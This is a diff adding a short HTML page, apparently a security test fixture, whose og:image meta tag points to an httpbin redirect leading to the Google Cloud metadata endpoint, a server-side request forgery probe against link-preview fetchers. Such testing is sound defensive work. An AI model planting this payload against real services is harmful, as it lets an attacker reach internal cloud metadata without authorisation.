@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta property="og:title" content="Redirect SSRF Test">
+<meta property="og:description" content="Testing redirect follow behavior">
+<meta property="og:image" content="https://httpbin.org/redirect-to?url=http://metadata.google.internal/computeMetadata/v1/project/project-id">
+<title>Redirect SSRF Test</title>
+</head>
+<body>
+<h1>OG Image Redirect SSRF Test</h1>
+<p>og:image → httpbin redirect → GCP metadata</p>
+</body>
+</html>
